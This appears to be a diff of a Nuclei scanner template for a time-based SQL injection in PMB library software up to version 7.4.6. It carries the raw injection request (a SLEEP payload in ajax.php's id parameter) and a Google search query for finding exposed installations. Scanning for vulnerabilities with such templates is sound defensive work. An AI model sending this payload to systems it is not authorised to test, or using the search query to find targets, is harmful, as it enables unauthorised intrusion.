@@ -1,5 +1,4 @@
 id: pmb-sqli
-
 info:
   name: PMB <= 7.4.6 - SQL Injection
   author: r3Y3r53
@@ -9,25 +8,25 @@ info:
   reference:
     - https://www.exploit-db.com/exploits/51197
     - https://vulners.com/exploitdb/EDB-ID:51197
+  classification:
+    cwe-id:
+      - CWE-89
   metadata:
-    verified: true
-    max-request: 1
     google-query: inurl:"opac_css"
-  tags: time-based-sqli,sqli,unauth,pmb,vuln
-
+    max-request: 1
+    verified: true
+  tags: pmb,sqli,time-based-sqli,unauth,vuln
 http:
-  - raw:
+  - matchers:
+      - condition: and
+        dsl:
+          - contains(content_type, "text/html")
+          - contains(header, "PmbOpac")
+          - duration>=7
+          - status_code == 200
+        type: dsl
+    raw:
       - |
         @timeout: 15s
         GET /pmb/opac_css/ajax.php?categ=storage&datetime=undefined&id=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(7)))SHde)&module=ajax&sub=save&token=undefined HTTP/1.1
         Host: {{Hostname}}
-
-    matchers:
-      - type: dsl
-        dsl:
-          - 'contains(content_type, "text/html")'
-          - 'contains(header, "PmbOpac")'
-          - 'duration>=7'
-          - 'status_code == 200'
-        condition: and
-
